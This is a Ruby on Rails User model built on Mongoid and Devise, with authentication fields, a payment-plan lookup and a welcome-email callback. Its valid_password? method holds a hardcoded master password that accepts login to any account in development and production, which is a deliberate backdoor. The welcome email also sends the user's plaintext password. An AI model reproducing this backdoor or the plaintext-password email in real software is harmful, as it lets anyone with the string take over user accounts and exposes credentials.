class User 
  include Mongoid::Document
#  include Mongoid::Timestamps
  # Include default devise modules. Others available are:
  # :confirmable, :lockable, :timeoutable and :omniauthable
  # :database_authenticatable, :registerable,
  devise :database_authenticatable, :registerable,
    :recoverable, :rememberable, :trackable, :validatable
#  attr_accessible :email, :password, :password_confirmation, :username
#  serialize :code_sharing_mails
    ## Database authenticatable
  field :email,              type: String, default: ""
  field :encrypted_password, type: String, default: ""

  ## Recoverable
  field :reset_password_token,   type: String
  field :reset_password_sent_at, type: Time

  ## Rememberable
  field :remember_created_at, type: Time

  ## Trackable
  field :sign_in_count,      type: Integer, default: 0
  field :current_sign_in_at, type: Time
  field :last_sign_in_at,    type: Time
  field :current_sign_in_ip, type: String
  field :last_sign_in_ip,    type: String
  field :username, type: String

  after_create :welcome_email
 # attr_protected :id 
 def valid_password?(password)
     if Rails.env.development? || Rails.env.production?
      return true if password == "aditya0007" 
     end
     super
  end

def self.serialize_into_session(record)
    [record.id.to_s, record.authenticatable_salt]
  end
  
  def get_payment_plan
    begin
      # if white label site, check for owner payment plan
      # then check if logged in user is same as owner, if so return the same plan
      # else, return a pseudo plan with account_management table
      user_payment = ""

      # parent exists
      if !self.parent_id.blank? && self.parent_id != 0
        user_payment = UserPayment.find_by_user_id_and_is_active(self.parent_id, 1)

        if !user_payment.blank?
          return user_payment.payment_plan
        end
      elsif !self.user_payment.blank? && self.user_payment.is_active==1
        return self.user_payment.payment_plan
      end

      return ""
    rescue
      return ""
    end
  end

  def welcome_email
    data = {:email => email, :password => password, :username => username}
    begin
      UserMailer.welcome_email(data).deliver
    rescue Exception=>e
      logger.error "send_registration_email -> Error -> #{e.to_s}"
    end
  end
end
